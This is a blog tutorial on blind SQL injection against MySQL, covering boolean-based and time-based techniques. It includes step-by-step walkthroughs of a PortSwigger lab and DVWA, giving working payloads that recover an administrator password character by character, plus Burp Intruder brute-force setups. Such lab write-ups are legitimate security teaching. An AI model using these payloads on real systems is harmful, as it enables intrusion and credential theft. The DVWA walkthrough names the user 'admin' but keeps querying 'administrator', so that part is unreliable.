## Understanding Types of SQL Injection Attacks - Part 2

**Recap**
Hey there, welcome back! Let's do a quick recap of our previous [article](https://blog.rehack.xyz/2023/10/understanding-types-of-sql-injection.html). We talked about in-band SQL injection, where sneaky attackers can snatch data using the same channel they communicate with the website. We took a closer look at two well-known techniques: union-based and error-based with examples to show how it all works.

---

**Types of SQL injection attacks**
Now that we have explored in-band SQL injection techniques, let's shift our focus to inferential and out-of-band attacks.
**![](https://lh7-us.googleusercontent.com/gjTBPMoHS3CekQ7ah3Ah1fHkXc0-iIXM99VUgemUTLDCkOVKYvfl5GMO7fHn0tfv_v_4Fr1D4YI1H6Q57-eMsIJgSU3PFg2ZiLYwnnY7Yl_8z_SC8Pj-g9yfD02qMPqaRT0FqtAgBa2eUjyU1HuV7LI)**

To avoid a lengthy article, we have divided the content into separate articles, each focusing on specific types of SQL injection. The articles will only cover the basic understanding of it. A further elaboration of the exploitation would be covered on a different series.

In this second part of this series, we will look into the Inferential SQL injection on MySQL DBMS.

---

**Inferential SQL injection**
Inferential SQL injection, commonly known as blind SQL injection, occurs when the attacker analyzes server responses and behavioral patterns after injecting specific payloads. Unlike in-band attacks, no data directly transfers from the web application to the attacker, which defines why it is called **"blind"** attacks.

The **two** most common techniques of inferential (blind) SQL injection are:

 1. Boolean-based
 2. Time-based
 
---

**Boolean-based**
In boolean-based SQL injection, the attacker manipulates the SQL query to force the application to return different responses based on whether the query evaluates to **TRUE** or **FALSE**.

As an example of a query is look similar to the following:
~~~
SELECT IF(1=1, (SELECT COUNT(*) FROM table1) = 5, 'ERROR')
~~~
The outer `1=1` condition always evaluates to TRUE, so it moves to the inner condition `(SELECT COUNT(*) FROM table1) = 5`. The inner condition checks if the total number of rows in table1 is equal to 5. If the application behaves normally, it means the query is TRUE; otherwise, it is FALSE.

---

Now, let us take a look on examples using DB Fiddle.

The following SQL query verifies if the condition `1=1` is TRUE, then it checks whether the number of rows in the `staff` table is equal to 7. If the inner condition is met, it return the integer 1.

**![](https://lh7-us.googleusercontent.com/6Sp3Z83RI4CPA51pVxKbZu8c-8yWCYKWkE4x9SwX0HD39SPi-7MPe2nzlLJnhCDUQV6phXHZ7EaGPz2RXZbImuhIlj615iV4H4QT9TQfSTVchlkTbWx2w6pWtibvmcDzqMmIBb8O_pbxA_t4InI9s5A)**
**![](https://lh7-us.googleusercontent.com/GpHmePWlyzIosRysgIMyfJsuEojy046vg477kjooHBnnqtCN5echKe15OsEynu-j2O-vgXcxxgBjBht1HdlS6WFB-cr3RjvaZJvQ1tvvFP4xF0BUBGX5AIdfMWUnyzQ_Dmn0ebqDpYivaWYI6zGGXSg)**

Let us take a look what would happen if the inner condition is not met. The query returned the integer 0 to indicates that the query evaluates to FALSE.

**![](https://lh7-us.googleusercontent.com/eFBqV141SYOtcLJacQlIq2NeMzMcnyRrh4J5PtnBxb44gB1BelSf6jJ7_3AMsvLvLEneThJUf39C43kNYL_WIXkcaU12EopaaJ6kIjFI9P7jVxvVvr866FWjr2WDQiS01tUaG2s_cZrdpEfIJnk6PuE)**
**![](https://lh7-us.googleusercontent.com/ce2HuF6mdmG4Wl_7cPdXEhnzGfmpBUx-pPW8XMYfW46g6TIa_VttpakxW6gpDvjHoYSP4o8Eh9n9kDJSZLES-4Q1SI5nOXyISt7Qx7pdlVVJ2DEkUchL5O2cd1xkp2M1WXW6AR-odRAFq1UnopfOvuY)**

Do note that:
 - In blind SQL injection context, the application behavior is what we need to observe:
		 a. Behaves normally, indicates the query is TRUE.
		 b. Behaves abnormally, indicates the query is FALSE.

The `'ERROR'` only will be triggered if the outer condition is not met. Let's see what would happen if the outer condition is `1=2`. Since the outer condition is already FALSE, the query will skip the inner condition and directly output the `ERROR`.
**![](https://lh7-us.googleusercontent.com/TeTAEfoeDtXsw5KIVofdm-ILz-X2r9fAICF63NWEoGBo41-Uc36ica_7RfcKgZKs5kur7atQmvLtoNu3bz-v7dsM7lF1_dxuVaqYT9k10BBqMOG3Ac3Pav9a0jCCNQHRf21r7Hg3P7nShF5crg_7Kps)**
**![](https://lh7-us.googleusercontent.com/xRbuuOHTtHxwBpRK48xHICWRNoPxt9DW9eLBR_1c465rL-528nLehtI6KKToUMP2MS-09nr_sPL3FkT6h8BFQIJYAwcWS0fp0fLSFO9NUax4czNj38BeRH9KnPcheMMaQv22-yHK-ksSYhgWDXHcLbM)**

Since we are talking about blind SQL injection, by starting with `1=1`, we can ensure that the true condition is always met, and then we can observe the behavior based on the inner condition, allowing us to infer the database information.

The following are some examples of SQL functions that are generally used in boolean-based approach:
~~~
IF()
RAND()
ASCII()
COUNT()
LENGTH()
SUBSTRING()
CONVERT()
and more..
~~~

---

Now, let's shift our focus to a practical example from PortSwigger Academy. 
Resources: [PortSwigger: Blind SQL Injection - Conditional Responses](https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses)

**Scenario: Blind SQL injection with conditional responses.**

The application executes a SQL query using the submitted cookie value. No visible results or errors are return, but a **'Welcome back!'** message appears when the query returns rows.  In the database, there is a table named `'users'` with columns of`'username'` and `'password'`.  To solve the lab, we need to log in as the `administrator` user.

After gaining access to the lab, we are greeted with an e-commerce website with a 'Welcome back!' message in the top right corner.
**![](https://lh7-us.googleusercontent.com/wtD-aGSTlYFg_QfboVcJ2SSWdKrw6b2rukvFqoGwN_wvnoHi5ZQSRAuzgoje73MDf_u7h2r2r0XycAUPOuUzu9Cmjl5AwLcGPFw5N7EfzKfnaZ_z7HQz_1xwGdzc2m3irP4xFWOY63WlUKcktDqVaUI)**

Click on a category, intercept the request using Burp Suite, and send it to Repeater. This enables us to inject payloads and analyze responses more effectively. Pay close attention to the `TrackingId=KG1asJAerNSeZ2s5` cookie.
**![](https://lh7-us.googleusercontent.com/bwN_A0V2tUHXJONpy4Yet-LQP7uLv40TGu-HdnvMorHr02O2aiJOQDmEzRnH2iubUNoWc8rWkNeQr_U9ATXCJzJHQ2rDCvNHOfynuIy9zhjbigxxBFGUnl8pfLl0YbJOyleJ11vErfK6wynfTwHoPXk)**

Let's change the cookie value to `TrackingId=KG1asJAerNSeZ2s5'abc123` and check if we still receive the 'Welcome back!' message. However, the message is now absent.
**![](https://lh7-us.googleusercontent.com/c7BUdubuH0MKsLkNgz6QJQ5Slud8pLtHJZDBHBJvFsnw9_MC0OsoIicVC9p7IrkEOwRDVmM1sMkjJNsvQydCe-FHDNXsspBPU_HxvNQroFfg0LujpMyN_Ah1f8_JVM0MjlUUk1ZN_6l5nmcVfSfTLjc)**

Now, let's attempt to uncover the administrator's password. We'll inject a simple boolean condition `' AND 1=1-- -` next to the cookie value for testing and note the presence of the 'Welcome back!' message.
**![](https://lh7-us.googleusercontent.com/S9ivWlP6wVrAydv7aSR_DTo96YATwWWn4hM_QLJR9dY5xsE-xVoOIdIkp9MJHa_xAtYpg4zQnKlyKeouuQGMB1OuDYgExRt0eU5fJvLVzwbSoe_n9CYmSt7xRq6-V3jon3-WhyipGbjiY-z_3JLyzyc)**

Next, let's try with this boolean condition `' AND 1=2 -- -` and note the absence of the 'Welcome back!' message.
**![](https://lh7-us.googleusercontent.com/o6hzyVuN1nIpiqQ8K8k1i5R3Uye18qCGx3Jvyq7v3mtpytaPs0ls49wiNYoQAAFGvHJiddIDItyCxq1werXOx_dYqkxWFLOTCKqP7cOL8wz32FLgxJMhmn6Sg0f08XlUMo4vJ_hidtn499DjyLzhUhM)**
~~~
Simplified version:
Welcome back! present = TRUE 
Welcome back! absent  = FALSE
~~~
Remember, the blind SQL injection process requires patience. Keep persistently guessing until we receive a TRUE response. Now, let's inject with specific payloads.

Length of administrator's password.
~~~
' AND (SELECT LENGTH(password) FROM users WHERE username='administrator') > 20 -- -
~~~
Result: **FALSE**
**![](https://lh7-us.googleusercontent.com/w7PBQillMcWDY5SszXW4dpqjHeHfT6ui7zOmX24CrVVMsgS4s9eCG0bQpZb6ZSyRXy6MQzcQ8rLF3ERmqpXboIUJVgXlAKfeBlrnBsFWaM2yaOIeZRjcz_Ts7CBRcjqfeppbcrZjI2fuE7KH-TJjoNI)**
~~~
' AND (SELECT LENGTH(password) FROM users WHERE username='administrator') = 20 -- -
~~~
Result: **TRUE**
**![](https://lh7-us.googleusercontent.com/PUQD-ugBepDzPf78ApqrXrPLdBYkJf9q79rIcsIe2JurivWt_Y5b3u9oGO1WofBU95gtVhGY-OJZiK5VBjJL1fWk1ih38ZQuo_GsjUkhDVFgXhMh-e_PHd2vb_j8w-O59P-xoe_51S6iLqW0FGBcmN8)**

First character of administrator's password.
~~~
' AND (SELECT SUBSTRING(password, 1, 1) FROM users WHERE username='administrator') > 'k' -- -
~~~
Result: **FALSE**
**![](https://lh7-us.googleusercontent.com/61DzDKb7BD58Lu4vzAmHwVcpNbXTYdCTLpP5dqTDTYJcrvX2006e9fRpGgFsszgAzNkYXPHYFRNJQvhJXOi1UB8rFAkf_CM8Hc4R2gjxTEJ5HKRw2gS20ix-kFhSkYz_cURdf74dIifgM5bT9rsOu_Y)**
~~~
' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator') = 'e' -- -
~~~
Result: **TRUE**
**![](https://lh7-us.googleusercontent.com/ymMs7ixxC3Y8GBfftsILnqxpNFbIW4e9GD3-4V04DkkbRVQNRpTkJeGis3YZjzlaz1HPGm9stJ7HmKDgFRvXizzejO5Km0wFrjTasGPePRvRe487MUX6566WMC_6kw5JBsWBRIThemTY8Y4bnJ08s-I)**

Second character of administrator's password.
~~~
' AND (SELECT SUBSTRING(password,2,1) FROM users WHERE username='administrator') > '7' -- -
~~~
Result: **TRUE**
**![](https://lh7-us.googleusercontent.com/k9H2Qak5za9mGuhJc_HEouuS1L70TfF0YWrDtmVvKwQkrs0rpnlcsLDlvrOz5d6cD9Dh3WsMDAnM82SDihtjFLyb-f_p75BcDCDhRavXP9qTcfC46IX30XctbJ1z9z4mqDn4vgoz8MYohU9jGqz7Erk)**
~~~
' AND (SELECT SUBSTRING(password,2,1) FROM users WHERE username='administrator') = '9' -- -
~~~
Result: **TRUE**
**![](https://lh7-us.googleusercontent.com/cXhjGeBRB-UlvGmH3j3y3oWBEB3tbApO2rWijRRsCGsJVgCKyuftVwsVd4hlAQnYfJ-pWlh2Q_Or1mliBtwOfc6YYd2sDhSxwTh1EqjogD8VU84x_gb2iI4WV1ZL229hPhMMJAm4-G8DEcFkHKP_MDM)**

The password is 20 characters long, guessing each character can be a time-consuming. To expedite the process, we will leverage the Intruder feature in Burp Suite.

Begin by forwarding the request to Intruder and choose **Cluster bomb** as the attack type. Clear the payload position with **Clear §** and click **Add §** on the position where payloads will be inserted.
**![](https://lh7-us.googleusercontent.com/jN3FR8E08sHWnGIK4breZhjEcUKnQJg7xM6HzlJ4nRn2fO8G7G0lTuNlgd-NT8jOGmSR8-5sb1Oeb6Der985cLkZUFO-WHukI8UoDn1bXtdEn1m_T0BUl8zMDKcBEsRPvKZfi9lyW3eYpK2KDIdEimM)**

Then, go to 'Payload' tab and set the payloads as below:

For payload set 1, we opted for number payloads. In the settings, we specified the range as 1 to 20 to align with the password length, with an increment of 1.
**![](https://lh7-us.googleusercontent.com/JRG_ZFJPtKtABeeyUn_eWdxU5z78Q1_-SZGdKTY0ufKvvmkwXdQLKwXXhmDoLOmEo4RWr4Mx_gPSfAUKEQFMJ8cD1CLeOdN0jP5EYRlPiiASbKFfG8fA26yn0XS2uupJV03ivvODlGIPbx08oUb0Q-Y)**

For payload set 2, we opted for brute force payload. In the settings, we specified the minimum and maximum lengths as 1. The characters have been set by default.
**![](https://lh7-us.googleusercontent.com/ZAbSDtMcai42_iQWP7xsTAr-rOWmbdymXMO11tpiwAOy4e10vrJ97i4HrRuEcZHKihYisktbtZDFuH_7aeLvKO74n53DnRrWtjdhQECu7oixoitSnPTRjhYsuquwhIiWfODZZfTgUjYGYDNQ2hVK8ko)**

Under the 'Options' tab, we need to add 'Welcome back' as a new expression in the settings to highlight results that match the specified expression.
**![](https://lh7-us.googleusercontent.com/Y54LhRIRShYl0CORgFcW9GJ9l7SXNgqv1Rse0luUgE28u8PJPUtsO1NPlhAMqps5VfzaViqnKHF7FQZzIFi6bsbWRmfq4HeXmSyUDiSDtfQj0I1jASmexn7a-vsr16Leef5TjaVc44HWVLiqhFQBXHg)**

Click on 'Start attack' and patiently await its completion. Once done, we can organize the results by sorting and arranging the characters in the correct order.
**![](https://lh7-us.googleusercontent.com/C6231Xwe59qPqJVwGp8uHSEf4W49lzGrU4JLZJ8IGcIsFseZQc7hemvsi1r8xYi6Re8xJfr28mskQmWDYoTys9uz9zI7E4iU9lahCiORmR6hnv1lGlUgakFREhyzFp7jBbciRuWJ0zlRoK4n2Fz278s)**

To solve the lab, click on 'My Account', enter the username and password that we have discovered.
~~~
username: administrator
password: e9096v2nw6tsdjvf3an3
~~~
**![](https://lh7-us.googleusercontent.com/futzzlngYCdn2bkeWOWPPTgLrDbGHzIuuT9wQiXR7YlanxzGAA__hlTLZOwzxtwymPSuLTulUH_pOWBZkFPDxKR51rtLx5JOHg_-arUXFygsoGjwGEEGwQ7_I2kJ-Zbccuzjc3QiXgzvAwn-S1X5tR0)**

Upon clicking the 'Login', we have successfully login as administrator.
**![](https://lh7-us.googleusercontent.com/TuDbdFcBhbUwKdMfYmJ6Xe4DNUDOPrfZAzOsY89cC7PciPAOnkoPak2lNBcq3u3Mkr0O--8Yg9KLlZzLoSTZoi2P58U7fn-9mr2iG9CwyJIsQ1cRiC6vkLarudkWkss2VAt2fqZyacr36GltmNDu5qA)**

---

**Time-based**
In time-based SQL injection, the attacker sends a crafted query, prompting the database to delay its response. A prolonged delay indicates a **TRUE**, while an immediate response indicates a **FALSE**.

As an example of a query is look similar to the following:
~~~
SELECT IF(1=1,SLEEP(5),'ERROR')
~~~
The outer `1=1` condition always evaluates to TRUE, so it moves to the inner condition `SLEEP(5)`. The inner condition initiates a deliberate delay of 5 seconds using the `SLEEP` function. This delay serves as a distinctive marker for a TRUE.

---

Now, let us take a look on examples using DB Fiddle.

The following SQL query verifies if the condition `(SELECT COUNT(*) FROM staff) = 7` is TRUE. If it is **TRUE**, the `SLEEP(5)` function will be triggered and the application response will be delayed for 5 seconds. Here the execution time is **5001ms** (5 seconds).
**![](https://lh7-us.googleusercontent.com/OFxGcQll4B0xdyCH58dnuwqucAIfymPlhMEGUTjwLlP4fvhVyJda6z5k4zMVySwYgJv4r6Qc3VFGyqH5m3KPEM2EMjrq-S_jhZs6X19Rfkx7wIkz9AUtuEd_fzVq6IJkKhSSJkCc9Sy2Lpv87WicA0Y)**
**![](https://lh7-us.googleusercontent.com/FxhVptfExCMy6DO2WlG7mtIAWQvTbpBCcEmFZ4DHaQo_WzdzTvYdi3R2X-CiIx3O59RY3SQcyi8VGuF9clV4MjjXWK_Og9wZ6q68PqWQ5iVkiSZs4D0LNjD5zg5qMe_MBxhKh20GDgaNEaYoQhzFn5E)**

Let us take a look what would happen if the outer condition is not met. The query response immediately and returned the `ERROR` to indicates that the query evaluates to **FALSE**. Here the execution time is **0ms** (0 second).

**![](https://lh7-us.googleusercontent.com/7fVgNDLL31je9-b8cX1tARS13dhM8PmE863rez9Exod_0gUOZw-WlZrSWXe2wGDvW42gg-OHdmY9QfS_FU8kqsaiCoTLHeEKJ_Sz9RmD4M1cD44yTTZNKjS5sD_ybJgoBhbIAycnQ8d_Jy70jlSsHxU)**
**![](https://lh7-us.googleusercontent.com/Q-hv6zIC7yIf059oiV9-RHn4__4WzBr1_7dBWW9tPjXMxzNqG2GG3CUAdbYJfPigybxuqYgN9Fi6WzsSRgoDaoK6DBMXffe3jrPDg-JSxGuM3JmDErWED5UXLnhWwzJFJ6eXik4Uyt94dSLePqHIjVo)**

Do note that:
 - In time-based context, the execution time is what we need to observe:
		 a. Delay response, indicates the query is TRUE.
		 b. Immediate response, indicates the query is FALSE.

The following are some examples of SQL functions that are generally used in time-based approach:
~~~
IF()
SLEEP()
BENCHMARK()
EXTRACTVALUE()
WAITFOR DELAY
CASE WHEN
and more..
~~~

---

Now, let's shift our focus to a practical example from Damn Vulnerable Web Application (DVWA). 
Resources: https://github.com/digininja/DVWA. 

**Scenario: Blind SQL injection with time delays**

The application requires an input to verify whether the user ID is valid or invalid. In the database, there is a table named `'users'` with `'username'` and `'password'` columns. To solve this, we need to find the password of administrator using time-based SQL injection.
**![](https://lh7-us.googleusercontent.com/SnSLl9GnTSiBN6JBMFjg7uPCnKn5ZG0BccYK2z01RSIRDQLGX9RbhRthlWIAYiLm7-BTQkdkLsRU-nOBfWjeH2PdBxgh8lAPyq75hgL3WNch3ATPnD25_OJi6TtGTNIbCrsbRs7bb-kSIQJyoAH2G74)**

We will utilize Burp Suite's Repeater to intercept and modify requests easily. To start, let's test the input field with both a valid and an invalid user ID.

Valid user ID
**![](https://lh7-us.googleusercontent.com/y9XPh4w8KGGn2zxiNGFkEXCep2z-V7POzBFSWEWJrntfHnWtVH1U6FObYeNpseL3HilmmKO6HDKuNpe6gfBBonTt-bRR8tSqM7vP4DnooPwe3SGelBEfUV-35sto7aT_q09qmnlZWfVCeSrHQqW1SqE)**

Invalid User ID
**![](https://lh7-us.googleusercontent.com/0zcc2byQhMZX5WUo_OV2QCMM5rRSwo-VVL4yW7R42ivRpHUab_OvopWuw1ZbkTl3AnuMjNhq35HruEHWppeIiN25zDW6jG52CkR4xZMZcNJegBSVdO_d_boWepQeTO0f3mudiCnWaNHeNm3lUZrzJkk)**

In time-based SQL injection, the response does not matter but the execution time is. A prolonged execution time indicates TRUE, while a short execution time indicates FALSE.
~~~
Simplified version:
longer execution time  = TRUE 
shorter execution time = FALSE
~~~
Now, let's check if the input is vulnerable to time-based SQL injection. We will merge our payloads with the valid user ID to confirm the execution of our injections. 
~~~
1' AND IF(1=1, SLEEP(2), 0) -- 
~~~
Result: **TRUE**
**![](https://lh7-us.googleusercontent.com/TVJ2LTWrJiWLc3h9JjlUZ4j7Stwx8CxVzZZRypm67r1PRiPP2ZVEB-5gDOE95mbpkILwxsrT8ADOmuu8ECbzxRZfUoC0h7vWrhTeGF-jE80ctirknxlIA336K7gPhlvu0uCQWBEAHzDd7vNro1bX6Co)**
**![](https://lh7-us.googleusercontent.com/S0hfhIOAj8_5wuC2GtxjV17F1jEOgQ5sDzQDVd-smcgWQ_esshLzmd7n_zrfbttD66wLw1_BD4HDB_pRsBEFH0xgILXECDJN2HABL-iQFUB1yj_wrxEePQNZGeToTJR6539a6Ae2eOlwIwwG0mv-754)**

A FALSE response occurs if the outer condition is not met. For example, `1=2` always evaluates to FALSE, so the inner condition `SLEEP(2)` will not be executed.
~~~
1' AND IF(1=2, SLEEP(2), 0) -- 
~~~
Result: **FALSE**
**![](https://lh7-us.googleusercontent.com/dlk7wtKZxmz8gdipFOss-r7NblS8Ycsix-CSy1wjM1UnM_HI7Veg7ppz4NaEmqo9_yMXmQoNF_qlCa8MM2UL5vCX8ZzcqmmqeWvxXhkYP-AwcrAT2l5GjR9IL0RPwSpajXSSrI97VLsSExFpOTKcKvU)**
**![](https://lh7-us.googleusercontent.com/fu0rbKJmIwPb71VdvlrajEq7rIATfKXlfw2o2nTt6525I9_PlpLEA5uk5NyYLdIP5CTFBPAMb1mT9qa-cP7PFwGJ-hSoBcGeq3NIBBUPdrIXNPiQ9-fRjVPJQjgaZp-8RQpM6DFXjdV3yyAEPK77WRs)**

Next, we will check whether the user `administrator` exists in the database.
~~~
1' AND IF((SELECT COUNT(*) FROM users WHERE username='administrator') = 1, SLEEP(2), 0) -- 
~~~
Result: **FALSE**
**![](https://lh7-us.googleusercontent.com/3FDFwbSsoey8zEnYl7JD8Vh-7pyg-RcZmj8tZL3TVfOgdFI95_yf-ZDdHayxxEiyImPZdJ6jdyThz-zAVBGXhh7Sz83lEVjMIGddVQZDNraNwGJIyhsOovf0cTjcY9SIJgIPFoFYo7nVARqlNTC-J1g)**
**![](https://lh7-us.googleusercontent.com/2mWn-GwODJO0PDoDyhx_41fCrUoS4M-AkFqtFKQL2ZN1cyeAVyYWZH0DP7FdZ475LJI3eKuvO71DNyKsuQC7D2dL4pEY52XxEjyVKuMEcxuzgIzSe6DLJQ5TzaaFHgpBOhhBKTRtI2ArpCSdaY674_s)**
~~~
1' AND IF((SELECT COUNT(*) FROM users WHERE username='admin') = 1, SLEEP(2), 0) -- 
~~~
Result: **TRUE**
**![](https://lh7-us.googleusercontent.com/B_cSGB2qDBqhsDJ-ES_Ss0wnGJ9hh00GyQT2xTg9qp1tdT9UkUkH-RkTbV2eoBRhDRR6gaozOrIZXSSk3L7qfuasCfPgDHCCvxapcHBdhuVYDJSer-okNGw3TngiyPiAJCWQbeR4ZRw11YMOYEomAhs)**
**![](https://lh7-us.googleusercontent.com/k57dU9aAc4O6-WGFiSiD0_T9fwW5A8GBUHjDDHgJFCMM6nzgorIO-cns0US56kwr1gccs0STpX0dAqjW7BFQ0vcS5YNt86jPWOVZtYN456UxfTo48KeUCy2Okp-AX4pYWOcp5UHsbtppTU8oONX-oDE)**

Now that we have identified the administrator's username is `admin`, let's proceed to uncover the password. Begin with the length of the password.
~~~
1' AND IF((SELECT LENGTH(password) FROM users WHERE username='administrator') > 20, SLEEP(2), 0) -- 
~~~
Result: **FALSE**
**![](https://lh7-us.googleusercontent.com/71UWkGKZL9ZQ3E0Mi9mBnpkGFQdnmMqqg-zQ6Xdl85vtjOUCC10TV_TTlCYm0WJNPoLa39CBwJMxfaCeQ05AULppJqm8Cilyo_RzrpxBeIQgNeKhgAwiqP7upXlK3EHj4ZgXU0IGoPO2-Cp3PdbJdv0)**
**![](https://lh7-us.googleusercontent.com/8RAehrMogt6EPsFXa-JSvjXq0SYmziBtx-4pZyoCe0FQIiHOQncJdPuYumMQkQx36L3VBxjRvZL5vSG9zivH1EfdRFE4jDMcbqRHlcbxQEENXecPtw__WoZU3OChc_LxgBOYAIksYd-MlFrnaL-BCVc)**
~~~
1' AND IF((SELECT LENGTH(password) FROM users WHERE username='administrator') = 19, SLEEP(2), 0) -- 
~~~
Result: **TRUE**
**![](https://lh7-us.googleusercontent.com/y-ONC2uek9wl-i9vgW3BYowq4jTc3BfPwkeAgZT2YUkbkV2HOqabKxP1eU37KC6S7oF1xy63VGU6ZkqHTxRKBDbwkXUlmSh5hdEIpYoKg11E_TSYoSpLPcX0tfWb4wZKP2T5YbfWEYXpsX0DoVQlLmY)**
**![](https://lh7-us.googleusercontent.com/g86WcHcK0zy2_ZIjnluG5mRLWggsq5ywA1-gIDup6XxY86HfNmYQek9DIwD53rBTSdlah1CwNID30hHawk0T5T4o7hjZrNenidc3VSk5DgkMgTWvjFZbUsgXGU2EHEY4wkmw9LtN2q9Fug-bPUHtsPY)**

The password is 19 characters long. Now, let's find the first character of the password.
~~~
1' AND IF((SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator') > 's', SLEEP(2), 0) -- 
~~~
Result: **FALSE**
**![](https://lh7-us.googleusercontent.com/SCFIj6mLor49wfBYT7tJthZX_s1XKltkuz_pdIqitYTkNvLW7KvSYaHOeyIK5kmFnF1OdEVKy1fdPCiOmrKbBfVL7tKsDC0Sz5K8GMstqzsZ7kE_ILeUDG8mlKM1CPFcJLCsstUOaErDsNshQjvSvUY)**
**![](https://lh7-us.googleusercontent.com/8RAehrMogt6EPsFXa-JSvjXq0SYmziBtx-4pZyoCe0FQIiHOQncJdPuYumMQkQx36L3VBxjRvZL5vSG9zivH1EfdRFE4jDMcbqRHlcbxQEENXecPtw__WoZU3OChc_LxgBOYAIksYd-MlFrnaL-BCVc)**
~~~
1' AND IF((SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator') = 's', SLEEP(2), 0) -- 
~~~
Result: **TRUE**
**![](https://lh7-us.googleusercontent.com/Ris4Tt9UFkDpTaanozsiGrmPa9r1ToTXiGMY7A1AyRxfV3cX1Povm4Iaqu8s8ndyOQfsiR524NIgsc3U69VN1zlmKdcedP21urobwHO4w4o1Ml9WfDRwT-Y_YH4An_fNVq8zWG8Gf8Q0K5kP1dvQJX0)**
**![](https://lh7-us.googleusercontent.com/1P1Pvow8SJ-Ic-4PSd1H9u-ZPD7714kVrpeZBvRFb7hVZgmmbFoI7kSyqgyJb0uNxCk-bNyZzh6B4kDtZkLa6-kAb-M5NKCxP4MZaMT3O_iWJlzkIzn8jv3vIkh65u1HSWhaZQTTdvvPOE-X9MHQgAY)**

Second character of the password.

~~~
1' AND IF((SELECT SUBSTRING(password,2,1) FROM users WHERE username='administrator') < 'o', SLEEP(2), 0) -- 
~~~
Result: **FALSE**
**![](https://lh7-us.googleusercontent.com/oLQVvSt0MTseb7hBE9OaHBI_uyk0x2WkiO4ns_IM6GgySbghAobvJCS-cXk3nT7Zqs5XdnQWNh72T1kBp6RjGdM6HLrkO3l0ik8DF8I-yGBHKvZPs4lMveWTWLl2wb4X3uQZkWHez6scfge-E9o5GTI)**
**![](https://lh7-us.googleusercontent.com/UTn7P3gX4eaPKebMZ3323aWlBYaLOqPnedOwZE9L57syLuKKkrCP6dt0FZQpi7L5Aiy1Ogdo6bUmJ8lvVbijIdJ4Kikw46sA5C1_98qVkJ1pQhPS1-a1-YuKP5CqF6dZhofCcxwX1sEgFbjZ5ctTcwo)**
~~~
id=1' AND IF((SELECT SUBSTRING(password,2,1) FROM users WHERE username='administrator') = 'u', SLEEP(2), 0) -- 
~~~
Result: **TRUE**
**![](https://lh7-us.googleusercontent.com/PHHITmX8NszyUAZRQk3NlKLXtOyhA1A3BgTHyp1RFUK4Ol9S_g_dT6nKdppS6rMl0BGSmCXaLJbe_BnthRZCuYJTWZOKRAHXSIQpkUky1dxUKxZ3OmoZXa1uC8B5Pnd7NScU6VbdWZxoF2CyGWCaVgw)**
**![](https://lh7-us.googleusercontent.com/1P1Pvow8SJ-Ic-4PSd1H9u-ZPD7714kVrpeZBvRFb7hVZgmmbFoI7kSyqgyJb0uNxCk-bNyZzh6B4kDtZkLa6-kAb-M5NKCxP4MZaMT3O_iWJlzkIzn8jv3vIkh65u1HSWhaZQTTdvvPOE-X9MHQgAY)**

Let's speed up the process with Burp Suite's Intruder. Start by sending the request to Intruder and select **Cluster bomb** as the attack type. Clear the payload position with **Clear §** and click **Add §** at the location where payloads will be injected.
**![](https://lh7-us.googleusercontent.com/IYPMnmgCndeMvWQA2WHIpTLi231Uu2cgFdiVlqMkeRjQ-V1ZO6fXf15RFY7vFiUVaLXE2mIzE1YeCfs7Gwq9twV_qV5bFjxi2Av2qYqthXZrhed95TpZfAYvhQCUJ1bTNu6F8LcfmU1cY-KGpl5zEF0)**

Next, go to the 'Payload' tab and configure the payloads as follows:

For the first payload set, we choose numerical payloads. In the settings, we defined the range as 1 to 19 to match the discovered password length, with an increment step of 1.
**![](https://lh7-us.googleusercontent.com/v0SzdH-p52SWMQrJNR2Ap1CDpMWXzbz9vRabLk450wiuvqKYzgx07bffSRNQhJCk1lzF8DDBG97XxhaMeDpa-bv4ghXgWOLlI7JqtFp9pKcqE5IbynzXVkT2fVZ2UiR2R3MBClkLWiTETnRhx_Y8xH0)**

For the second payload set, we choose a brute-force approach. In the settings, we set the minimum and maximum lengths to 1, while the characters remained at the default settings.
**![](https://lh7-us.googleusercontent.com/41-xjs2_HFGzybtoPCAllYhwHS-HpAaWUArVgYE6UZR9V38gtlXEoTgrRmgkNr5a4Z0hYwrqttJowWf97AcO5AsiozwcAVUYQN5F-S_j0jqD-ZHjLw_nlBbwJY0tFcYTb8vNHsPvIUg9Gg-x3RQTdFA)**

Click 'Start attack' and patiently await its completion, Once done, click on 'Columns' and enable the 'Response completed' option to view the results' execution time. 
**![](https://lh7-us.googleusercontent.com/_WsWRfhaeLSvNsfW0aBWdJ7mtQfDAL-nJfQDTaU2GkJrRswBKBaqlyfDQXAm4QvFE84ofdpelGGOITAYXSfyFZ58fiMKZC-OcRSsAVkjzcSu4ddLTV46Wx0RbOufTBE1ommBoM1jLHUDbUrEyYWyRbk)**

Sort the results by searching for responses completed in **2000ms** and rearrange the characters in the correct order.
**![](https://lh7-us.googleusercontent.com/saGKNPuPB67J-i2fdfaAo4d9q3XS4t27mLEpVVdSfv3xJsuLX--HnawfqrzKcOzqKu8rf7wAmxZOlVviFzmS9px662-ykH39WLJEk1ZEmEhlPAVrV2VFO8Z5HfT7KGSXHyYDMPozzrdf3A4yjTe6xzg)**

To solve this, let's login as the administrator with the username and password that we have discovered.
~~~
username : admin
password : superstrongpassword
~~~
**![](https://lh7-us.googleusercontent.com/OIZ3eLW33uGbWpwp7jxtpJsdM-zoOGZV9U8y0vHCCLmCdHk-R7oMh5FxJP7dT0ac7BUJ9hgk0pisw-mQ9splc28TUUFLdFPcWCYqrAZeqtZ6qIk-jGwmh4QlB3sOrwDnMn_91pFSE5Rikv8LuTw06h4)**

Upon clicking the 'Login', we have successfully login as admin.
**![](https://lh7-us.googleusercontent.com/-oq-Bi2rLRQpCqRHyueeSRRZzKTZLIu-lqRYSPmt33Ww4ZbZvmmWbEk_U7sV4MV1R-LFV1na3ryOd6wS1JnnV42GRwc3_w6G_alsttMc_1OEUQudHBe5c7fSb5Ow6mcQcjKsvBw0tc6q0xt2sBYuh7M)**

That concludes part 2 of the "Understanding Types of SQL Injection Attacks" series. We hope you have gained valuable insights from this post. Stay tuned for next parts.

Thank you.

References:

 - https://github.com/OWASP/www-community/blob/master/pages/attacks/Blind_SQL_Injection.md
 - https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md
 - https://www.websec.ca/kb/sql_injection

